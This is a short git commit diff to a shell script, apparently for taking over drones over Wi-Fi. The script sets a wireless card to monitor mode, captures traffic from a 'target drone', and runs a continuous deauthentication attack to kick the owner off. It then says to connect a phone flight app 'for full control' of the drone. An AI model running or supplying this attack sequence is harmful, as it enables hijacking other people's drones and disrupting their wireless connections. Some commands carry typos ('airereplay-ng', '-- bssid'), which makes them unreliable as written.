b5ca1d2f584d65de6e766a0e07486963688f5129
Arcadeus OPS <info@arcadeusops.com>
2023-02-24 11:03:29 +0800

    Update connetOpenNetwork.sh

--- connetOpenNetwork.sh
+++ connetOpenNetwork.sh
@@ -8,14 +8,14 @@ airmon-ng start wlan1
 
 airmon-ng check kill
 
-airodump-ng wlan1mon "SSID of target drone" # auto inserion of SSID
+airodump-ng wlan1mon "SSID of target drone" # auto inserion of SSID eg | grep SSID
 
 airodump-ng -c 6 -- bssid "bssid of target drone" -w /root/drone wlan1mon # auto insertion of bssid
 
 # wait for airodump to show data
 # open second terminal
 
-airereplay-ng -0 0 -a "bssid" -c "Station" wlan1mon # deauth attack and auto insertion of bssid
+airereplay-ng -0 0 -a "bssid" -c "Station" wlan1mon # deauth attack and auto insertion of bssid eg |grep BSSID
 
 # connect with phone for full control. Use drone flight app eg FreeFlight Pro or Freeflight Mini available in Google Play/AppleStore.
 
